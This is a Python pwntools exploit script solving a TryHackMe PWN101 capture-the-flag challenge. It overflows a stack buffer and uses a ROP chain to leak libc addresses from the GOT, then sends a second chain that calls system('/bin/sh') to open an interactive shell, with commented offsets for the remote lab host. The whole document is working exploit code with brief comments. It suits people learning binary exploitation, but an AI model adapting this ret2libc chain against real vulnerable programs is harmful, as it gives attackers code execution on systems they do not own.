#!/usr/bin/python3

# TryHackMe - Room PWN101 - Challenge 9

from pwn import *
#context.log_level = 'debug'

host = "10.10.10.10"
port = 9009
#io = remote(host, port)

executable = './109'
io = process(executable)
context.binary = binary = ELF(executable, checksec=False)
rop = ROP(binary)

payload1 = flat([
    b"A" * 0x20,                  # [32] Offset that fills the buffer
    b"B" * 0x8,                   # [8]  Overwrite EBP

    rop.rdi.address,              # Executes: pop rdi ; ret ;
    binary.got.puts,              # Pops value from the stack and stores it into the rdi register, which is puts@got.
    binary.plt.puts,              # Puts address gets executed

    rop.rdi.address,
    binary.got.gets,              # Another loop with the address of gets@got.
    binary.plt.puts,

    rop.rdi.address,
    binary.got.setvbuf,           # Another loop with the address of servbuf@got.
    binary.plt.puts,

    binary.symbols["main"],       # Then the next instruction will execute main again.
])

info('Payload #1')
io.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload1)

leaked_puts = u64(io.recvline().strip().ljust(8, b"\x00"))
leaked_gets = u64(io.recvline().strip().ljust(8, b"\x00"))
leaked_setvbuf = u64(io.recvline().strip().ljust(8, b"\x00"))

info(hex(leaked_puts))
info(hex(leaked_gets))
info(hex(leaked_setvbuf))
warn("Use this addresses to figure out what version of the library is used.")

# For local environment.
libc = binary.libc
libc.address = leaked_gets - libc.symbols['gets']
info(hex(next(libc.search(b'/bin/sh'))))

payload2 = flat([
    b"A" * 0x20,                            # [32] Offset that fills the buffer
    b"B" * 0x8,                             # [8]  Overwrite EBP

    rop.ret.address,                        # Extra `ret` for padding. Ubuntu 18.04 requires 16-byte alignment on stack pointer RSP (movaps).
    rop.rdi.address,                        # pop rdi ; ret
    p64(next(libc.search(b'/bin/sh'))),     # LOCAL - This if the address of the string: /bin/sh\x00
    p64(libc.symbols['system']),            # LOCAL - This time it sends the address of the function system.
    # p64(leaked_gets + 0x133c8a),          # REMOTE - This if the address of the string: /bin/sh\x00
    # p64(leaked_gets - 0x30c40),           # REMOTE -  This time it sends the address of the function system.
])

info('Payload #2')
io.sendline(payload2)
io.recv()
warn("I'm affraid you pwned!")
io.interactive()
exit()
